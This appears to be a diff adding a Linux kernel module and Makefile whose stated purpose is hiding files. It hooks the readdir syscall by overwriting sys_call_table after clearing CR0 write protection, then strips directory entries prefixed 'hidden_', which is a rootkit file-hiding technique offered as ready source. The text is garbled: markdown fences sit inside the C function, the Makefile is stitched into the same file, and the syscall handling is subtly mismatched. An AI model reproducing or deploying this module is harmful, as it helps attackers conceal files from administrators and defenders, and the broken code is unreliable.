@@ -1,0 +1,77 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/sched.h>
+#include <linux/uaccess.h>
+#include <linux/syscalls.h>
+#include <linux/init.h>
+#include <linux/string.h>
+
+#define TARGET_PREFIX "hidden_"
+
+static asmlinkage long (*original_readdir)(unsigned int, void __user *, unsigned long);
+
+asmlinkage long hooked_readdir(unsigned int fd, void __user *dirent, unsigned long count) {
+long ret = original_readdir(fd, dirent, count);
+struct linux_dirent64 *d;
+char *buf = (char *)dirent;
+unsigned long offset = 0;
+
+```
+while (offset < ret) {
+    d = (struct linux_dirent64 *)(buf + offset);
+    if (strncmp(d->d_name, TARGET_PREFIX, strlen(TARGET_PREFIX)) == 0) {
+        // Skip this entry
+        ret -= d->d_reclen;
+        memmove(d, (char *)d + d->d_reclen, ret - offset);
+        continue;
+    }
+    offset += d->d_reclen;
+}
+return ret;
+
+```
+
+}
+
+static int __init hide_files_init(void) {
+original_readdir = (void *)sys_call_table[__NR_readdir];
+write_cr0(read_cr0() & ~0x10000);
+sys_call_table[__NR_readdir] = hooked_readdir;
+write_cr0(read_cr0() | 0x10000);
+return 0;
+}
+
+static void __exit hide_files_exit(void) {
+write_cr0(read_cr0() & ~0x10000);
+sys_call_table[__NR_readdir] = original_readdir;
+write_cr0(read_cr0() | 0x10000);
+}
+
+module_init(hide_files_init);
+module_exit(hide_files_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Your Name");
+MODULE_DESCRIPTION("A kernel module that hides files with a specific prefix.");
+
+
+
+
+
+
+
+
+
+
+obj-m += hide_files.o
+
+all:
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+
+
